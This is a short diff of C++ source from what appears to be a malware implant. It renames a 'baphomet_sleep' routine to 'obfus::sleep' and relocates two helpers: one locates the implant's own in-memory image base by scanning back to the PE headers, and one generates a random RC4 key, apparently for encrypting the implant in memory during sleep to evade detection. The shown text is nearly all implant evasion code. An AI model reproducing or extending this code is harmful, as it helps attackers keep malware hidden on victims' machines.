@@ -4,46 +4,8 @@
 
 #include "sleep.hpp"
 
-uint8_t*
-get_implant_base_address() {
-
-    auto* itr = reinterpret_cast<char*>(get_implant_base_address);
-    const char dos_string[] = {"!This program"};
-
-    while(true) {
-        if (itr[0] == '!' && itr[1] == 'T') {
-
-            //
-            // "!This program cannot be run in DOS mode."
-            //
-
-            if (strncmp(dos_string, itr, 13) == 0) {
-                while (itr[0] != 'M' || itr[1] != 'Z') {
-                    --itr;
-                }
-
-                return reinterpret_cast<uint8_t*>(itr);
-            }
-        }
-
-        --itr;
-    }
-}
-
-
-void init_rc4_key(USTRING *pKey) {
-
-    srand(time(nullptr));
-    uint8_t* itr = static_cast<uint8_t*>(pKey->Buffer);
-
-    for(size_t i = 0; i < pKey->Length; i++) {
-        itr[i] = (rand() % 256);
-    }
-}
-
-
 void
-baphomet_sleep(uint32_t sleep_time) {
+obfus::sleep(const uint32_t sleep_time) {
 
     CONTEXT ctx_curthread   =   { 0 };
     CONTEXT ctx_protrw      =   { 0 };
@@ -169,4 +131,41 @@ baphomet_sleep(uint32_t sleep_time) {
     }
 
     DeleteTimerQueue(hTimerQueue);
+}
+
+uint8_t*
+get_implant_base_address() {
+
+    auto* itr = reinterpret_cast<char*>(get_implant_base_address);
+    const char dos_string[] = {"!This program"};
+
+    while(true) {
+        if (itr[0] == '!' && itr[1] == 'T') {
+
+            //
+            // "!This program cannot be run in DOS mode."
+            //
+
+            if (strncmp(dos_string, itr, 13) == 0) {
+                while (itr[0] != 'M' || itr[1] != 'Z') {
+                    --itr;
+                }
+
+                return reinterpret_cast<uint8_t*>(itr);
+            }
+        }
+
+        --itr;
+    }
+}
+
+
+void init_rc4_key(USTRING *pKey) {
+
+    srand(time(nullptr));
+    uint8_t* itr = static_cast<uint8_t*>(pKey->Buffer);
+
+    for(size_t i = 0; i < pKey->Length; i++) {
+        itr[i] = (rand() % 256);
+    }
 }
